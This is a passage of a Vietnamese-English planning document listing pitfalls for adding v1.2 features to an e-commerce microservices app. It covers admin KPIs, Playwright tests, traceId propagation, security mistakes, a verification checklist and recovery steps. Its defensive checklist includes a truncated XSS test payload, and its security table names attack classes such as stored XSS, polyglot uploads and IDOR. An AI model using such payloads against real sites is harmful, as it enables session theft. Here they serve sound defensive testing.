**Phase to address:** Phase planning Product detail enhancements. SSR cho `/products/[slug]`.

---

### Pitfall 22: UI-02 admin KPI — cross-service N+1 cho dashboard

**What goes wrong:**
Admin dashboard show 4 KPI: tổng products, low-stock count, total orders today, total users. Naïve impl: 4 separate calls qua gateway → product-svc + product-svc + order-svc + user-svc. Mỗi call full HTTP round-trip qua gateway. p95 ~ 800ms cho dashboard.

Worse: nếu KPI là "top 5 customers" → cần JOIN orders + users CROSS service → loop qua 5 user_id, query user-svc 5 lần (N+1 cross-service).

**Why it happens:**
- Microservices boundary — không thể JOIN SQL.
- Gateway không có aggregation endpoint.

**How to avoid:**
- **Dedicated aggregate endpoint** mỗi service: `GET /api/products/stats?metrics=total,lowStock` trả 1 response. Tương tự `/api/orders/stats?metrics=todayCount,todayRevenue`. Dashboard gọi 3 endpoint parallel (Promise.all) thay vì 4+.
- Frontend `Promise.allSettled` → nếu 1 service down, KPI khác vẫn hiển thị (graceful degradation).
- Cho top-customers: order-svc tự lưu denormalized `customer_display_name` snapshot (giống pattern Reviews ở Pitfall 5).
- Cache KPI 30s ở FE (SWR `dedupingInterval`).

**Warning signs:**
- Admin dashboard load > 1s.
- Network tab: 4+ requests cho 1 page.
- 1 service slow → cả dashboard hang.

**Phase to address:** Phase planning UI-02 closure. Define `/stats` endpoint per service.

---

### Pitfall 23: UI-02 admin KPI — cache vs realtime tradeoff

**What goes wrong:**
Admin expect realtime (vừa duyệt order xong, KPI phải update). Nếu cache 5 phút → stale → admin confusion. Nếu no-cache → mỗi reload hit DB heavy aggregations.

**Why it happens:**
- "KPI" mơ hồ giữa realtime ops dashboard và analytics dashboard.

**How to avoid:**
- **Định nghĩa scope:** v1.2 KPI là **realtime ops** (4 cards đơn giản: count from indexed columns) → KHÔNG cache, query nhanh < 50ms.
- KHÔNG dùng materialized view cho v1.2 (overkill).
- "Last refresh: HH:MM:SS" hiển thị ở UI để admin biết.
- Auto-refresh mỗi 30s (interval) hoặc manual refresh button.

**Warning signs:**
- Admin báo "tôi vừa duyệt xong tại sao chưa update".
- DB CPU spike khi nhiều admin cùng mở dashboard.

**Phase to address:** Phase planning UI-02 closure.

---

### Pitfall 24: Playwright re-baseline — stale selectors + race với async data

**What goes wrong:**
v1.1 Playwright tests viết `page.click('text=Đăng nhập')`. v1.2 homepage redesign đổi thành `text=Sign in` hoặc icon-only button → test fail. Hoặc test `await page.click('.add-to-cart-btn')` → CSS class thay đổi → fail. Race: `page.click('button[name=submit]')` rồi `expect(page.locator('text=Success')).toBeVisible()` — submit là async + redirect, success message ở page khác → test pass intermittently (flaky).

**Why it happens:**
- Selector dùng text content / CSS class instead of stable `data-testid`.
- Test không await network idle / specific request response.

**How to avoid:**
- **Selector strategy:**
  - Best: `data-testid="login-submit"` (immune to text/style change).
  - Good: role-based `page.getByRole('button', {name: 'Đăng nhập'})` — vẫn break khi đổi text nhưng meaningful.
  - Bad: `.btn-primary` (style class).
- **Race avoidance:**
  - `await page.waitForResponse(r => r.url().includes('/api/users/auth/login') && r.ok())` trước assertion.
  - `await page.waitForURL('/profile')` cho redirect.
  - KHÔNG dùng `await page.waitForTimeout(1000)` (anti-pattern).
- **Re-baseline strategy:** đi từng test, update selectors, run `--reporter=list` xem fail nào, fix per file. KHÔNG mass replace.

**Warning signs:**
- Test pass local, fail CI (race condition exposed bởi slower env).
- 1 test "đôi khi pass đôi khi fail" (flaky).
- Selector match nhiều element ("strict mode violation").

**Phase to address:** Phase planning Playwright re-baseline. Add `data-testid` audit cho mọi v1.2 component mới.

---

### Pitfall 25: Cross-cutting — traceId KHÔNG propagate cho new endpoints

**What goes wrong:**
v1.0/v1.1 đã có pattern: gateway sinh traceId, propagate qua header `X-Trace-Id`, mọi service log với traceId, ApiErrorResponse envelope include traceId → debug 1 request xuyên service. v1.2 thêm endpoints mới (`/api/wishlist`, `/api/reviews`, `/api/addresses`...). Nếu controller mới không inherit `BaseController` hoặc filter mới không apply trên path mới → response thiếu traceId → debug khó.

**Why it happens:**
- Spring filter chain config có thể explicit list paths.
- Mới copy-paste controller, miss base class.
- OpenAPI spec mới không include traceId trong error schema.

**How to avoid:**
- Spring filter `TraceIdFilter` apply `/**` (mọi path) trong `WebMvcConfigurer`.
- Mọi controller extend `BaseController` hoặc dùng `@RestControllerAdvice` global exception handler — đã đặt traceId vào MDC.
- ApiErrorResponse envelope (đã ship v1.0) là **shared schema** — mọi error path qua `@ExceptionHandler` → tự include traceId.
- Test integration: gọi endpoint mới với header `X-Trace-Id: test-123` → response (success + error) phải echo traceId.

**Warning signs:**
- Mở DevTools, response endpoint mới không có header `X-Trace-Id`.
- Error response thiếu field `traceId` (chỉ có `code`, `message`).
- Service log không có traceId trong context khi debug bug ở endpoint mới.

**Phase to address:** Phase planning mọi feature có endpoint mới + integration verify phase.

---

### Pitfall 26: Cross-cutting — ApiErrorResponse cho new error branches

**What goes wrong:**
v1.1 FE `services/http.ts` dispatch 5 failure branches (401, 403, 409 STOCK_SHORTAGE, 422, 5xx). v1.2 thêm: review `409 DUPLICATE_REVIEW` (user đã review product), wishlist `409 ITEM_EXISTS`, address `409 LIMIT_EXCEEDED` (max 10 addresses). Nếu BE return 409 với code mới mà FE dispatcher không decode → fallback toast generic "Đã xảy ra lỗi" → UX kém, user không biết phải làm gì.

**Why it happens:**
- FE typed module sinh từ OpenAPI nhưng error responses thường đặc tả lỏng (`oneOf` trong response 4xx).
- ApiError dispatcher hardcode list domainCode trong v1.1 → quên update khi thêm code mới.

**How to avoid:**
- **Định nghĩa enum `DomainErrorCode` trong shared module** (BE Java enum + FE TS enum sinh ra từ OpenAPI). Mọi error code mới phải register vào enum này.
- ApiError dispatcher dùng switch trên domainCode — fallback case throw `UnknownDomainCodeError` ở dev mode để dev thấy missing handler.
- Mỗi feature plan trong v1.2 mở một section "Error codes added" với list code + FE handler + i18n message.
- E2E test: trigger từng error case → assert toast text Việt đúng.

**Warning signs:**
- FE toast hiển thị "[object Object]" hoặc raw JSON.
- User báo "tôi không hiểu lỗi này".
- BE return 409 nhưng FE handle như 500.

**Phase to address:** Phase planning mọi feature + integration verify.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Denormalize `averageRating` không recompute từ scratch | Tránh AVG query | Drift sau N edit/delete | Never (recompute nếu denormalize) |
| Hard-delete addresses không snapshot trong order | Schema đơn giản | FK violation hoặc orphaned data | Acceptable nếu giữ snapshot pattern v1.1 |
| Cache featured products TTL không invalidate | Latency thấp | Stale data sau admin update | Acceptable nếu TTL < 60s + warning UX |
| KHÔNG có separate password-change endpoint | Code ít hơn | Account takeover risk | Never |
| Disable email change UI ở v1.2 | Skip 2-step verify flow | User phải contact admin | Acceptable cho v1.2, plan v1.3 |
| Offset pagination thay cursor cho order list | Default Spring Data | Drift khi data thay đổi | Acceptable nếu volume thấp + hidden từ user |
| `<img>` thay vì `<Image>` cho hero | Đơn giản | LCP regression, SEO | Never trên public pages |
| No-cache facet count (recompute mỗi request) | Always fresh | DB load tăng | Acceptable cho v1.2 (< 10K products) |
| Snapshot reviewer displayName | Tránh cross-service N+1 | Tên cũ nếu user đổi tên | Acceptable (industry pattern) |
| `data-testid` chỉ vài component | Test chạy nhanh | Re-baseline đau khi UI thay đổi | Never — add testid trên mọi interactive element |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| product-svc <-> user-svc (review reviewer name) | Loop fetch user-svc per review | Snapshot displayName vào ReviewEntity lúc create |
| order-svc <-> product-svc (order filter joins) | Cross-service JOIN | Denormalize `productName, productThumbnail` vào OrderItem (đã ship v1.1) |
| Gateway <-> admin dashboard | 4+ separate calls cho KPI | Per-service `/stats` endpoint, FE Promise.all |
| middleware <-> auth endpoints | 401 redirect cho cả `/api/users/auth/login` | `AUTH_PATHS_NO_REDIRECT` skiplist (đã fix bug v1.1) |
| Flyway <-> multi-PR concurrent | Cùng V-number trên cùng service | Reserve V-numbers trong MILESTONES.md trước plan-phase |
| OpenAPI codegen <-> new error code | Add error code BE-only | Update enum shared, regenerate FE module, update dispatcher |
| traceId <-> new controllers | Filter chỉ apply path cũ | Filter `/**` + global `@RestControllerAdvice` |
| `next/image` <-> external CDN | Domain không whitelist trong `next.config.js` | `images.remotePatterns` config |
| Postgres <-> default-flag concurrency | 2 UPDATE riêng | Partial unique index `WHERE is_default = true` |
| Multipart upload <-> avatar | Trust client MIME | Magic byte check + re-encode |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| N+1 reviews -> users lookup | Product list TTFB > 800ms | Snapshot reviewer name | 50+ reviews per page |
| Facet count GROUP BY mọi request | DB CPU spike | Cache 60s + invalidate trên mutation | 10K+ products + 50+ concurrent admin |
| Cross-service KPI loop | Dashboard load > 1s | `/stats` endpoint per service | Mọi scale |
| Hero image 2MB PNG | LCP > 4s | WebP + `next/image priority` | Mọi traffic |
| Wishlist infinite scroll | RAM 500MB+ | Pagination + virtualization | 100+ items per user |
| Offset pagination order list | Drift, slow OFFSET 1000+ | Cursor pagination | 10K+ orders per user |
| AVG/COUNT mỗi request product detail | TTFB > 200ms | Denormalize + recompute | 1K+ reviews per product |
| Avatar serve qua Spring static | Heap pressure khi nhiều concurrent | CDN hoặc dedicated endpoint với cache header | 100+ concurrent users |

---

## Security Mistakes (domain-specific, không OWASP generic)

| Mistake | Risk | Prevention |
|---------|------|------------|
| Review render qua `dangerouslySetInnerHTML` | Stored XSS -> JWT từ localStorage bị steal | React tự escape + BE sanitize |
| Avatar upload trust MIME từ client | RCE qua polyglot, XSS qua HTML upload | Magic byte check + re-encode + cap size |
| Email change không verify | Account takeover qua reset link tới email attacker | 2-step confirm hoặc disable UI |
| Password change không verify oldPassword | Session hijack -> permanent lockout | Dedicated endpoint require oldPassword |
| Wishlist endpoint không check `userId == authUser` | IDOR — user A xem/edit wishlist user B | Mọi wishlist endpoint filter `user_id = currentUser.id` |
| Address book endpoint không check ownership | IDOR — đọc địa chỉ user khác | Same — filter ownership server-side |
| Admin KPI endpoint không kiểm tra ROLE_ADMIN | User thường xem stats nhạy cảm | `@PreAuthorize("hasRole('ADMIN')")` |
| Search/filter SQL via string concat | SQL injection | Spring Data method derivation hoặc named params |
| Order filter không scope theo userId | User A đọc order user B qua manipulated filter | BE force `WHERE user_id = currentUser.id` cho non-admin |
| middleware skip static assets bằng regex sai | Auth check chạy trên `_next/static` -> slow + có thể leak path qua redirect | Whitelist explicit `_next/static`, `_next/image`, `favicon.ico` |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Wishlist "stock" snapshot stale | User confused: "đã có hàng sao add to cart fail" | JOIN live product data khi list wishlist |
| Filter trả 0 results không suggest | User stuck, bounce | "Không tìm thấy kết quả với filter X. Thử bỏ filter Y" |
| Date range filter không có timezone hint | User Việt Nam thấy đơn "đêm qua" miss | Document `[from, to)` + auto-detect TZ từ browser |
| Address book không có default flag visible | Checkout autofill random | Badge "Mặc định" + radio chọn default |
| Avatar upload không show preview | User upload xong mới thấy crop sai | Crop UI ngay sau chọn file (react-easy-crop) |
| Review submit không có loading state | Double-submit -> duplicate review | Disable button + skeleton |
| Password change success không revoke other sessions | User lo "có ai login khác không" | Hiển thị "Sẽ đăng xuất các thiết bị khác" + thực hiện |
| Order filter empty state thiếu CTA | User không biết phải làm gì | "Chưa có đơn hàng. [Mua sắm ngay]" |
| Search filter facet count = 0 không grey out | User click -> empty results | Disable + tooltip "Không có sản phẩm trong filter này" |
| Homepage hero CLS (Cumulative Layout Shift) | Layout nhảy khi image load | Specify `width`/`height` + aspect ratio reserve space |
| Breadcrumb không clickable | Không thể navigate ngược | `<Link>` từng segment |
| Image gallery không hiển thị "X/N" indicator | User mất context | "2 / 8" trên góc gallery |

---

## "Looks Done But Isn't" Checklist

- [ ] **Wishlist:** Verify unique constraint `(user_id, product_id)` và "move to cart" check stock live.
- [ ] **Reviews:** Verify XSS payload `<img src=x onerror=...>` render là plain text, không execute.
- [ ] **Reviews:** Verify edit + delete recompute average từ scratch (không drift sau 10 edits).
- [ ] **Address book:** Verify hard-delete address không ảnh hưởng order đã đặt (snapshot intact).
- [ ] **Address book:** Verify partial unique index ngăn 2 default cùng lúc.
- [ ] **Profile editing:** Verify password change require oldPassword (test với JWT valid + sai oldPassword -> 400).
- [ ] **Profile editing:** Verify email change disabled hoặc 2-step confirm (không phải PATCH thẳng).
- [ ] **Profile editing:** Verify avatar upload reject `.html`, `.exe`, polyglot, > 2MB.
- [ ] **Order filter:** Verify timezone — đơn 23:59 ngày 30/4 GMT+7 hiển thị ở filter "tháng 4".
- [ ] **Order filter:** Verify enum binding `?status=INVALID` -> 400, không 200 empty.
- [ ] **Order filter:** Verify scoping — user A không thấy order user B qua manipulated `userId` param.
- [ ] **Search filter:** Verify same-facet OR (Brand=Dell + Brand=Asus -> results > Dell only).
- [ ] **Search filter:** Verify URL < 1KB với 10 filters active.
- [ ] **Homepage:** Verify Lighthouse LCP < 2.5s sau add hero.
- [ ] **Homepage:** Verify featured product click -> product detail không 404.
- [ ] **Product detail:** Verify keyboard nav gallery (Tab + ArrowLeft/Right + Esc).
- [ ] **Product detail:** Verify breadcrumb ổn định (cùng product -> cùng breadcrumb).
- [ ] **AUTH-06:** Verify direct visit `/profile` (chưa login) -> 307 redirect qua middleware (không qua API 401).
- [ ] **AUTH-06:** Verify `/_next/static/...` KHÔNG bị middleware gate.
- [ ] **AUTH-06:** Verify login redirect loop không tái xuất (sai password -> banner, không loop).
- [ ] **UI-02:** Verify dashboard load < 1s với 4 KPI parallel.
- [ ] **UI-02:** Verify dashboard graceful degradation — 1 service down, 3 KPI khác vẫn hiển thị.
- [ ] **Flyway:** Verify mọi service boot fresh (drop DB + Flyway migrate from scratch) không collision.
- [ ] **Playwright:** Verify mọi v1.2 test dùng `data-testid` hoặc `getByRole`, không CSS class selector.
- [ ] **Playwright:** Verify test không có `waitForTimeout` (chỉ `waitForResponse` / `waitForURL`).
- [ ] **Cross-cutting:** Verify mọi endpoint mới có header `X-Trace-Id` ở response.
- [ ] **Cross-cutting:** Verify mọi error 4xx/5xx mới có `ApiErrorResponse {code, message, traceId}` đúng schema.
- [ ] **Cross-cutting:** Verify FE `services/http.ts` dispatcher decode mọi domainCode mới (review/wishlist/address).

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Flyway V-number collision | LOW | Rename file V_X__ -> V_(X+offset)__, verify history table không có entry cũ; nếu có -> `flyway repair` |
| Rating average drift | MEDIUM | Một-time SQL: `UPDATE products SET avg_rating = (SELECT AVG(rating) FROM reviews WHERE ...)`. Sửa code recompute pattern |
| XSS stored trong reviews | HIGH | Nếu đã có data: bulk sanitize qua migration. Audit logs xem có user nào đã victim -> notify, force password reset |
| Default address conflict (2 row is_default=true) | LOW | SQL: `UPDATE addresses SET is_default = false WHERE user_id = ? AND id != (SELECT MAX(id) FROM addresses WHERE user_id = ? AND is_default = true)`. Add partial unique index |
| Wishlist duplicate items | LOW | SQL: `DELETE FROM wishlist_items WHERE id NOT IN (SELECT MIN(id) FROM wishlist_items GROUP BY user_id, product_id)`. Add unique index |
| Account takeover qua password change không verify | HIGH | Force-reset all passwords qua email; revoke all JWT (rotate JWT secret); audit logs |
| middleware matcher bypass static asset | LOW | Update `config.matcher` exclude pattern; deploy |
| LCP regression sau homepage redesign | LOW | Revert hero image; audit `next/image priority`; convert sang WebP |
| Order filter timezone bug | MEDIUM | Backfill: convert existing `LocalDateTime` columns sang `OffsetDateTime` qua migration; FE chuyển TZ |
| Cache stale featured product | LOW | Clear cache; reduce TTL hoặc invalidate hooks |
| Avatar polyglot uploaded | MEDIUM | Audit uploaded files; re-encode all qua ImageIO; quarantine suspect |
| traceId thiếu ở endpoint mới | LOW | Apply filter `/**`, không cần data fix |

---

## Pitfall-to-Phase Mapping

> Ánh xạ giả định roadmap v1.2 sẽ chia thành ~5 phases (residual closure, account, discovery, checkout+homepage polish, integration verify). Roadmap agent có thể restructure.

| # | Pitfall | Prevention Phase (proposed) | Verification |
|---|---------|------------------------------|--------------|
| 1 | Flyway V4 collision | Roadmap setup (pre-phase) + integration verify phase | All services boot fresh from clean DB |
| 2 | AUTH-06 middleware matcher | Phase 9 — Residual closure | Playwright direct-visit test |
| 3 | Reviews XSS | Phase — Reviews | Playwright XSS payload test |
| 4 | Rating average drift | Phase — Reviews | Integration test edit/delete cycle assert avg recomputed |
| 5 | Reviews N+1 | Phase — Reviews | `show-sql=true`, count queries per request |
| 6 | Address soft vs hard delete | Phase — Address book | Integration test delete address -> order intact |
| 7 | Default-flag concurrency | Phase — Address book | Migration include partial unique index; concurrent test |
| 8 | Password change without oldPassword | Phase — Profile editing | Integration test reject without oldPassword |
| 9 | Email change without verify | Phase — Profile editing | UI disable hoặc 2-step flow test |
| 10 | Avatar upload bypass | Phase — Profile editing | Penetration test polyglot/oversized/path-traversal |
| 11 | Order filter timezone | Phase — Order filtering | Boundary test 23:59 GMT+7 |
| 12 | Order filter injection | Phase — Order filtering | OpenAPI enum sync + invalid param test |
| 13 | Pagination drift | Phase — Order filtering | Document tech debt (offset acceptable v1.2) |
| 14 | Wishlist duplicate + stale stock | Phase — Wishlist | Migration unique index + JOIN live product test |
| 15 | Wishlist memory leak | Phase — Wishlist | Lighthouse memory profile |
| 16 | Facet count staleness | Phase — Advanced filters | No-cache contract documented |
| 17 | Filter OR/AND + URL state | Phase — Advanced filters | URL size test + multi-facet logic test |
| 18 | Hero LCP regression | Phase — Homepage redesign | Lighthouse CI gate |
| 19 | Featured cache mismatch | Phase — Homepage redesign | No-cache documented |
| 20 | Gallery a11y | Phase — Product detail | axe-core in Playwright |
| 21 | Breadcrumb mismatch | Phase — Product detail | SSR `/products/[slug]` |
| 22 | Admin KPI cross-service N+1 | Phase 9 — UI-02 closure | `/stats` endpoint per service + Promise.all |
| 23 | KPI cache vs realtime | Phase 9 — UI-02 closure | No-cache + "last refresh" UI |
| 24 | Playwright stale selectors + race | Phase 9 — Playwright re-baseline | `data-testid` audit + waitForResponse |
| 25 | traceId missing on new endpoints | Integration verify phase | Header check on all new endpoints |
| 26 | ApiErrorResponse missing branches | Integration verify phase | Trigger every error code, assert FE handle |

---

## Sources

- `.planning/milestones/v1.1-MILESTONE-AUDIT.md` — 4 PARTIAL gaps (DB-05 Flyway, AUTH-06 matcher, UI-02 dashboard, PERSIST-01 cart-side)
- `.planning/debug/login-redirect-cart-stock.md` — root cause http.ts 401 redirect áp dụng cho auth endpoints + CartItem thiếu stock snapshot
- `.planning/debug/products-list-500.md` — historic incident reference
- `.planning/PROJECT.md` — visible-first priority, defer backend hardening invisible
- Spring Boot reference: Bean Validation + `@PreAuthorize` + multipart config
- OWASP Java HTML Sanitizer (https://github.com/OWASP/java-html-sanitizer)
- Next.js middleware matcher syntax (https://nextjs.org/docs/app/building-your-application/routing/middleware#matcher)
- Postgres partial unique index (https://www.postgresql.org/docs/current/indexes-partial.html)
- Flyway versioning best practices (https://flywaydb.org/documentation/concepts/migrations#versioned-migrations)
- Radix UI Dialog focus trap (https://www.radix-ui.com/primitives/docs/components/dialog)
- Playwright best practices: `getByRole`, `data-testid`, `waitForResponse`

---

*Pitfalls research scope: ADDING v1.2 features tới existing v1.1 baseline.*
*Researched: 2026-04-26.*
*Confidence: HIGH — pitfalls grounded trực tiếp trong v1.1 incidents (Flyway V2, login redirect, cart stock bypass) + standard microservices/Next.js gotchas.*
